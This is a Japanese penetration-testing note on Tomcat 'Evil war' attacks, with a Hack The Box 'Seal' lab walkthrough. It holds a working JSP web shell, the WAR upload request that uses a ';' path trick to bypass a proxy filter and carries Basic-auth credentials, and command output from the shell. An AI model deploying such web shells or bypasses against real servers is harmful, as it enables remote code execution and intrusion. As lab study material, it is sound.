# tomcat

----

## Evil war
* managerにwarファイルをアップロードすることでRCEが可能
* ただしmanagerは初期状態で、ローカルホスト以外のアクセスが禁止されている
* そのため管理者が明示的にローカルホスト以外のアクセスを許可するか、もしくはリバースプロキシのバックエンドにtomcatが存在し、かつtomcatにリバースプロキシの設定がなされていない場合に、攻撃者はmanagerへのアクセスが可能となる
* なお、warファイルはjspファイルをzip圧縮したものでよい。
* Evil warをdeployする際のURLはmanager/html/uploadもしくは、[manager/text/deploy](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)である
* プロキシのバックエンドにtomcatが存在する場合、tomcatが「;」を無視することを利用し、フロントエンドのフィルタをバイパスすることが可能である
* Htb: Seal

  ```console
  ┌─[rio@parrot]─[~/Htb/Seal]
  └──╼ $cat cmd.jsp
  <form method="GET" action="">
          <input type="text" name="cmd" />
          <input type="submit" value="Exec!" />
  </form> <%!
  public String esc(String str){
          StringBuffer sb = new StringBuffer();
          for(char c : str.toCharArray())
                  if( c >= '0' && c <= '9' || c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c == ' ' )
                          sb.append( c );
                  else
                          sb.append("&#"+(int)(c&0xff)+";");
          return sb.toString();
  } %><%
  String cmd = request.getParameter("cmd");
  if ( cmd != null) {
          out.println("<pre>Command was: <b>"+esc(cmd)+"</b>\n");
          java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
          String line = in.readLine();
          while( line != null ){
                  out.println(esc(line));
                  line = in.readLine();
          }
          out.println("</pre>");
  } 
  ┌─[rio@parrot]─[~/Htb/Seal]
  └──╼ $zip webshell.war cmd.jsp
    adding: cmd.jsp (deflated 44%)
  ┌─[rio@parrot]─[~/Htb/Seal]
  └──╼ $cat deploy.req
  POST /manager/.;/html/upload?org.apache.catalina.filters.CSRF_NONCE=B4E7920D278D8F9C176C8555C7ED038E HTTP/1.1
  Host: 10.129.199.113
  User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: multipart/form-data; boundary=---------------------------25107724814121225253288826308
  Content-Length: 829
  Origin: https://10.129.199.113
  DNT: 1
  Authorization: Basic dG9tY2F0OjQyTXJIQmYqejh7WiU=
  Connection: close
  Referer: https://10.129.199.113/manager/.;/html
  Cookie: JSESSIONID=22BE1792013DD0DAD4D1DF39B78E76FF
  Upgrade-Insecure-Requests: 1
  Sec-GPC: 1
  
  -----------------------------25107724814121225253288826308
  Content-Disposition: form-data; name="deployWar"; filename="webshell.war"
  Content-Type: application/octet-stream
  
  P0S\cmd.jspUT   LLux
                      uRn0
                          =_hH"!Z@Àma٦nrtp
                                          O$ߣe78ahK'x=ؒ*ϤcF,Ǔg`1-[j@       L8^c{ﴽ;/M:t0P#,Q.4p~9ąȳLwU    ۋ-l6K?n9
                  W
                   oK鋍.8m〸L+l^fsq:cW,,IϲXWr'/_O)G{?{Ot|ȼ!bau;l
  J[sN/oGCX2?P0S\cmd.jspUTLux                                   G5]+;GzPCIy%Ae@t{/"J{mk[PJ|A$
                             PKM
  -----------------------------25107724814121225253288826308--
  ┌─[✗]─[rio@parrot]─[~/Htb/Seal]
  └──╼ $curl -k https://10.129.199.113/webshell/cmd.jsp?cmd=ls
  <form method="GET" action="">
          <input type="text" name="cmd" />
          <input type="submit" value="Exec!" />
  </form> <pre>Command was: <b>ls</b>
  
  conf
  lib
  logs
  policy
  webapps
  work
  </pre>
  ```

  
